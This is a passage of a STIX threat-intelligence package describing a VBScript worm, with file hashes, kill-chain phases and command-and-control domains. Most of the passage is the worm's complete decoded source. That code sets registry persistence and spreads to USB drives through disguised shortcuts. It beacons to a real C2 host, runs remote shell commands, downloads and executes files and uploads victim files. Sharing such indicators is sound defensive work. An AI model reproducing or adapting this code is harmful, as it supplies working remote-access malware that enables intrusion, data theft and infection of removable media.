      <indicator:Observable id="CISCP:Observable-d9d580bf-8c10-4ec0-b711-bfb1c9a330fb">
        <cybox:Object id="CISCP:Object-13ce77a7-0a65-46ee-bacc-12dd025507ad">
          <cybox:Properties xsi:type="FileObj:FileObjectType">
            <FileObj:File_Name condition="Equals">13dfSS.vbs</FileObj:File_Name>
            <FileObj:Size_In_Bytes condition="Equals">10463</FileObj:Size_In_Bytes>
            <FileObj:Hashes>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">694946ddda75f82c90ca2c2ba80157e4</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">020dd27ecf401266e5708e84794441c1289a6891</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">15eecc64b985236ca62b0ccfbbc992f9bbd80c5028a23edf919c9d62a44f13a9</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">192:+FyeP2id8stGmlQiSFFOtaCXCQpVWArc9cgJlrblrOUTlFvyJSucYZgCgvKTDfp:m4iGsgPiSFFOECXCQD/W6ZgVv+V</cyboxCommon:Fuzzy_Hash_Value>
              </cyboxCommon:Hash>
            </FileObj:Hashes>
          </cybox:Properties>
        </cybox:Object>
      </indicator:Observable>
      <indicator:Kill_Chain_Phases>
        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
      </indicator:Kill_Chain_Phases>
      <indicator:Sightings sightings_count="1">
        <indicator:Sighting timestamp="2014-06-24T00:00:00"/>
      </indicator:Sightings>
    </stix:Indicator>
    <stix:Indicator id="CISCP:indicator-80df81f6-5189-447e-8c39-41b11bca14ab" version="2.1.1" xsi:type="indicator:IndicatorType">
      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
      <indicator:Description>This file is the decoded content of the base64 encoded blob of data from the file named ewethxqlug.vbs (MD5: 2fc337753a9a084d1a042af12972a1f0).

The malicious script has the capability to extend the functionality of the code used in the file named 13dfSS.vbs (MD5: 694946ddda75f82c90ca2c2ba80157e4). The worm is capable of performing the following actions:

- maintaining persistence on the system by installing autorun registry keys
- installing a copy of itself on the removable media drive(s) found
- communicating with the command and control (C2) server and performing actions based on the response from the C2.

Additionally, the worm can:
a) receive updates from the C2 server
b) uninstall itself
c) download content from the C2 server
d) download and execute files obtained from other remote systems
e) upload a specified file to the C2
f) enumerate drivers installed on the infected system, and send the list back to the C2
g) enumerate all files and folders on the infected system and send gathered information back to the C2
h) enumerate all the running processes on the infected system and send the result to the C2
i) execute a command sent from the C2 server on the command line and send the result back to the C2 server
j) delete files and directories
k) kill running processes
l) sleep for a specified amount of time


----- BEGIN CODE -----

'&lt;[ recoder : houdini (c) skype : houdini-fx ]&gt;

'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "yahoo18.no-ip.org"
port = 83
installdir = "%temp%"
lnkfile = true
lnkfolder = true

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") &amp; "\"
installdir = shellobj.expandenvironmentstrings(installdir) &amp; "\"
if not filesystemobj.folderexists(installdir) then installdir =
shellobj.expandenvironmentstrings("%temp%") &amp; "\"
spliter = "&lt;" &amp; "|" &amp; "&gt;"
sleep = 5000
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next


instance 'sub. Creates registry keys and copies malicious script to 2
	'additional destinations.
	'See sub instance description for file-2.
while true

install 'sub. Copies itself to any removable drive attached to the
	'system, and creates short-cut to it.
	'See sub install description for file-2.
response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "excecute"
	param = cmd (1)
	execute param
case "update"
	param = cmd (1)
	oneonce.close
	set oneonce = filesystemobj.opentextfile (installdir &amp; installname , 2, false)
	oneonce.write param
	oneonce.close
	shellobj.run "wscript.exe //B " &amp; chr(34) &amp; installdir &amp; installname &amp; chr(34)
	wscript.quit
case "uninstall"
	uninstall
case "send"
	download cmd (1),cmd (2)
case "site-send"
	'download file from the remote server (server and file names are provided
	'by C2) and execute it on the victim's system.
	sitedownloader cmd (1),cmd (2)
case "recv"
	'uploads the content of the specified file to the remote server
	param = cmd (1)
	upload (param)
case "enum-driver"
	'sends information about all the drivers, enumerated on the infected
	'system, to the remote server in the following format
	'[path_to_the_driver]|[driver_type] + "&lt;|&gt;"
	post "is-enum-driver",enumdriver
case "enum-faf"
	'enumerates all files and folders on the infected systems.
	'the following data is sent to the remote server:
	'if item is directory: [path]||d|[directory_attributes] + "&lt;|&gt;"
	'if item is file: [path]|[file_size]|f|[file_attributes] + "&lt;|&gt;"
	param = cmd (1)
	post "is-enum-faf",enumfaf (param)
case "enum-process"
	'enumerates all the processes on the victim's system.
	'the following information about the process is sent
	'to the remote server:
	'[process_name]|[pid]|[process_path] + "&lt;|&gt;"
	post "is-enum-process",enumprocess
case "cmd-shell"
	'"cmdshell" function executes a command from the command line
	'and returns the output if any produced by the command.
	'"post" sends the returned result of "cmdshell" command to
	'the remote server.
	param = cmd (1)
	post "is-cmd-shell",cmdshell (param)
case "delete"
	'deletes specified file and the folder containing it.
	param = cmd (1)
	deletefaf (param)
case "exit-process"
	'kills process with the following command
	'"taskkill /F /T /PID [pid]"
	param = cmd (1)
	exitprocess (param)
case "sleep"
	'sleeps for the specified amount of time.
	param = cmd (1)
	sleep = eval (param)
end select

wscript.sleep sleep

wend



sub install
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon

upstart
for each drive in filesystemobj.drives

if drive.isready = true then
if drive.freespace &gt; 0 then
if drive.drivetype = 1 then
	filesystemobj.copyfile wscript.scriptfullname , drive.path &amp; "\"
	&amp; installname,true
	if filesystemobj.fileexists (drive.path &amp; "\" &amp; installname) then
	filesystemobj.getfile(drive.path &amp; "\" &amp;
	installname).attributes = 2+4
	end if
	for each file in filesystemobj.getfolder( drive.path &amp; "\" ).Files
	if not lnkfile then exit for
	if instr (file.name,".") then
	if lcase (split(file.name, ".")
	(ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
	file.attributes = 2+4
	if ucase (file.name) &lt;&gt; ucase (installname) then
	filename = split(file.name,".")
	set lnkobj = shellobj.createshortcut (drive.path &amp; "\" &amp;
	filename (0) &amp; ".lnk")
	lnkobj.windowstyle = 7
	lnkobj.targetpath = "cmd.exe"
	lnkobj.workingdirectory = ""
	lnkobj.arguments = "/c start " &amp; replace(installname," ",
	chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start " &amp;
	replace(file.name," ", chrw(34) &amp; " " &amp; chrw(34)) &amp;
	"&amp;exit"
	fileicon = shellobj.regread (
	"HKEY_LOCAL_MACHINE\software\classes\" &amp;
	shellobj.regread (
	"HKEY_LOCAL_MACHINE\software\classes\."
	&amp; split(file.name, ".")(
	ubound(split(file.name, ".")))&amp; "\")
	&amp; "\defaulticon\")
	if instr (fileicon,",") = 0 then
	lnkobj.iconlocation = file.path
	else
	lnkobj.iconlocation = fileicon
	end if
	lnkobj.save()
	end if
	end if
	end if
	next
	for each folder in filesystemobj.getfolder( drive.path &amp; "\" )
	.subfolders
	if not lnkfolder then exit for
	folder.attributes = 2+4
	foldername = folder.name
	set lnkobj = shellobj.createshortcut (drive.path &amp; "\" &amp;
	foldername &amp; ".lnk")
	lnkobj.windowstyle = 7
	lnkobj.targetpath = "cmd.exe"
	lnkobj.workingdirectory = ""
	lnkobj.arguments = "/c start " &amp; replace(installname," ",
	chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start explorer " &amp;
	replace(folder.name," ", chrw(34) &amp; " " &amp; chrw(34)) &amp;"&amp;exit"
	foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\
	folder\defaulticon\")
	if instr (foldericon,",") = 0 then
	lnkobj.iconlocation = folder.path
	else
	lnkobj.iconlocation = foldericon
	end if
	lnkobj.save()
	next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename
dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
filesystemobj.deletefile startup &amp; installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for each drive in filesystemobj.drives
if drive.isready = true then
if drive.freespace &gt; 0 then
if drive.drivetype = 1 then
	for each file in filesystemobj.getfolder ( drive.path &amp; "\").files
	on error resume next
	if instr (file.name,".") then
	if lcase (split(file.name, ".")(ubound(split(file.name, "."))))
	&lt;&gt; "lnk" then
	file.attributes = 0
	if ucase (file.name) &lt;&gt; ucase (installname) then
	filename = split(file.name,".")
	filesystemobj.deletefile (drive.path &amp; "\" &amp; filename(0)
	&amp; ".lnk" )
	else
	filesystemobj.deletefile (drive.path &amp; "\" &amp; file.name)
	end If
	else
	filesystemobj.deletefile (file.path)
	end if
	end if
	next
	for each folder in filesystemobj.getfolder( drive.path &amp; "\" ).subfolders
	folder.attributes = 0
	next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)

post = param
httpobj.open "post","http[:]//" &amp; host &amp; ":" &amp; port &amp;"/" &amp; cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if inf = "" then
	inf = hwid &amp; spliter
	inf = inf &amp; shellobj.expandenvironmentstrings("%computername%")
	&amp; spliter
	inf = inf &amp; shellobj.expandenvironmentstrings("%username%")
	&amp; spliter
	set root = getobject("winmgmts:{impersonationlevel=impersonate}!
	\\.\root\cimv2")
	set os = root.execquery ("select * from win32_operatingsystem")
	for each osinfo in os
	inf = inf &amp; osinfo.caption &amp; spliter
	exit for
	next
	inf = inf &amp; "plus" &amp; spliter
	inf = inf &amp; security &amp; spliter
	inf = inf &amp; usbspreading
	information = inf
else
	information = inf
end if
end function

sub upstart ()
on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0),
	"wscript.exe //B "
	&amp; chrw(34) &amp; installdir &amp; installname &amp; chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\
	currentversion\run\" &amp; split (installname,".")(0),
	"wscript.exe //B "
	&amp; chrw(34) &amp; installdir &amp; installname &amp; chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir &amp; installname,true
filesystemobj.copyfile wscript.scriptfullname,startup &amp; installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
	if disk.volumeserialnumber &lt;&gt; "" then
		hwid = disk.volumeserialnumber
		exit for
	end if
next
end function


function security
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
	versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) &amp; "."
for x = 1 to ubound (versionstr)
	osversion = osversion &amp; versionstr (i)
next
osversion = eval (osversion)
if osversion &gt; 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" &amp; sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
	security = security &amp; objantivirus.displayname &amp; " ."
next
if security = "" then security = "nan-av"
end function


function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" &amp;
	split (installname,".")(0) &amp; "\")
if usbspreading = "" then
	if lcase ( mid(wscript.scriptfullname,2)) = ":\" &amp; lcase(installname)
		then
			usbspreading = "true - " &amp; date
			shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp;
		split (installname,".")(0) &amp; "\", usbspreading, "REG_SZ"
	else
			usbspreading = "false - " &amp; date
			shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp;
		split (installname,".")(0) &amp; "\", usbspreading, "REG_SZ"
		
	end if
end If


upstart
set scriptfullnameshort = filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort = filesystemobj.getfile (installdir &amp; installname)
if lcase (scriptfullnameshort.shortpath) &lt;&gt;
	lcase (installfullnameshort.shortpath)
	then
	shellobj.run "wscript.exe //B " &amp; chr(34) &amp; installdir &amp;
	installname &amp; Chr(34)
	wscript.quit
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir &amp; installname ,8, false)
if err.number &gt; 0 then wscript.quit
end function


sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir &amp; filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if objfsodownload.fileexists (strsaveto) then
	objfsodownload.deletefile (strsaveto)
end if

if objhttpdownload.status = 200 then
	dim objstreamdownload
	set objstreamdownload = createobject("adodb.stream")
	with objstreamdownload
		.type = 1
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
	end with
	set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
	shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if
end sub

sub download (fileurl,filedir)

if filedir = "" then
	filedir = installdir
end if

strsaveto = filedir &amp; mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http[:]//" &amp; host &amp; ":" &amp; port &amp;"/" &amp;
	"is-sending" &amp; spliter &amp; fileurl, false
objhttpdownload.send ""

set objfsodownload = createobject ("scripting.filesystemobject")
if objfsodownload.fileexists (strsaveto) then
	objfsodownload.deletefile (strsaveto)
end if
if objhttpdownload.status = 200 then
	dim objstreamdownload
		set objstreamdownload = createobject("adodb.stream")
	with objstreamdownload
			.type = 1
			.open
			.write objhttpdownload.responsebody
			.savetofile strsaveto
			.close
		end with
	set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
	shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if
end sub


function upload (fileurl)
	'upload the content of the specified file to the remote server
dim httpobj,objstreamuploade,buffer
set objstreamuploade = createobject("adodb.stream")
with objstreamuploade
	.type = 1
	.open
		.loadfromfile fileurl
		buffer = .read
		.close
end with
set objstreamdownload = nothing
set httpobj = createobject("msxml2.xmlhttp")
httpobj.open "post","http[:]//" &amp; host &amp; ":" &amp; port &amp;"/" &amp; "is-recving" &amp; spliter &amp; fileurl, false
httpobj.send buffer
end function

function enumdriver ()

for each drive in filesystemobj.drives
if drive.isready = true then
	enumdriver = enumdriver &amp; drive.path &amp; "|" &amp; drive.drivetype &amp; spliter
end if
next
end Function

function enumfaf (enumdir)

enumfaf = enumdir &amp; spliter
for each folder in filesystemobj.getfolder (enumdir).subfolders
	enumfaf = enumfaf &amp; folder.name &amp; "|" &amp; "" &amp; "|" &amp; "d" &amp; "|" &amp;
	folder.attributes &amp; spliter
next

for each file in filesystemobj.getfolder (enumdir).files
	enumfaf = enumfaf &amp; file.name &amp; "|" &amp; file.size &amp; "|" &amp; "f" &amp; "|" &amp;
	file.attributes &amp; spliter
next
end function

function enumprocess ()

on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
		enumprocess = enumprocess &amp; objitem.name &amp; "|"
		enumprocess = enumprocess &amp; objitem.processid &amp; "|"
	enumprocess = enumprocess &amp; objitem.executablepath &amp; spliter
next
end function

sub exitprocess (pid)
on error resume next

shellobj.run "taskkill /F /T /PID " &amp; pid,7,true
end sub

sub deletefaf (url)
on error resume next

filesystemobj.deletefile url
filesystemobj.deletefolder url

end sub

function cmdshell (cmd)

dim httpobj,oexec,readallfromany

set oexec = shellobj.exec ("%comspec% /c " &amp; cmd)
if not oexec.stdout.atendofstream then
	readallfromany = oexec.stdout.readall
elseif not oexec.stderr.atendofstream then
	readallfromany = oexec.stderr.readall
else
	readallfromany = ""
end if

cmdshell = readallfromany
end function

-----  END CODE  -----</indicator:Description>
      <indicator:Observable id="CISCP:Observable-e7785e6d-731a-46f6-bf29-3ebcf65bcf33">
        <cybox:Object id="CISCP:Object-025e3765-4dff-4b93-8181-a2d860411394">
          <cybox:Properties xsi:type="FileObj:FileObjectType">
            <FileObj:File_Name condition="Equals">ewethxqlug_decoded.txt</FileObj:File_Name>
            <FileObj:Size_In_Bytes condition="Equals">14413</FileObj:Size_In_Bytes>
            <FileObj:Hashes>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">d763d864dfc657da7f80705c2f2babe3</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">a12bcceaf6a9c399c7accffe538b92281fd9d389</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:cBXKiGag3YYZSFFOECXCgJDaKX4AZc0r+9fTqj:cFKag3YYZSGECXCgEjuc43j</cyboxCommon:Fuzzy_Hash_Value>
              </cyboxCommon:Hash>
            </FileObj:Hashes>
          </cybox:Properties>
        </cybox:Object>
      </indicator:Observable>
      <indicator:Kill_Chain_Phases>
        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
      </indicator:Kill_Chain_Phases>
      <indicator:Sightings sightings_count="1">
        <indicator:Sighting timestamp="2014-06-24T00:00:00"/>
      </indicator:Sightings>
    </stix:Indicator>
    <stix:Indicator id="CISCP:indicator-e71681a1-8858-4c73-a433-8f655a03f2ac" version="2.1.1" xsi:type="indicator:IndicatorType">
      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
      <indicator:Description>The file ewethxqlug.vbs (MD5: 2fc337753a9a084d1a042af12972a1f0) uses this domain for C2 functionality over port 83.</indicator:Description>
      <indicator:Observable id="CISCP:Observable-e595a260-639e-4fb3-97c8-fede5510a21f">
        <cybox:Object id="CISCP:Object-9cbbef37-03af-4234-86ce-d0ec8df139cd">
          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
            <URIObj:Value condition="Equals">yahoo18.no-ip.org</URIObj:Value>
          </cybox:Properties>
        </cybox:Object>
      </indicator:Observable>
      <indicator:Kill_Chain_Phases>
        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
      </indicator:Kill_Chain_Phases>
      <indicator:Sightings sightings_count="1">
        <indicator:Sighting timestamp="2014-06-24T00:00:00"/>
      </indicator:Sightings>
    </stix:Indicator>
    <stix:Indicator id="CISCP:indicator-d0eb0af1-12d7-4c05-b087-480f3c44b583" version="2.1.1" xsi:type="indicator:IndicatorType">
      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
      <indicator:Description>The file 13dfSS.vbs (MD5: 694946ddda75f82c90ca2c2ba80157e4) uses this domain for C2 functionality over port 7777.</indicator:Description>
      <indicator:Observable id="CISCP:Observable-ff3df6e3-ace5-41e1-b6cb-da72e600cf9d">
        <cybox:Object id="CISCP:Object-132630a8-437f-4a90-9ecc-aaee016c936f">
          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
            <URIObj:Value condition="Equals">thescorpionkig.no-ip.org</URIObj:Value>
          </cybox:Properties>
        </cybox:Object>
      </indicator:Observable>
      <indicator:Kill_Chain_Phases>
        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
      </indicator:Kill_Chain_Phases>
      <indicator:Sightings sightings_count="1">
        <indicator:Sighting timestamp="2014-06-24T00:00:00"/>
      </indicator:Sightings>
    </stix:Indicator>
  </stix:Indicators>
  <stix:TTPs>
    <stix:Kill_Chains>
      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
      </stixCommon:Kill_Chain>
    </stix:Kill_Chains>
  </stix:TTPs>
</stix:STIX_Package>

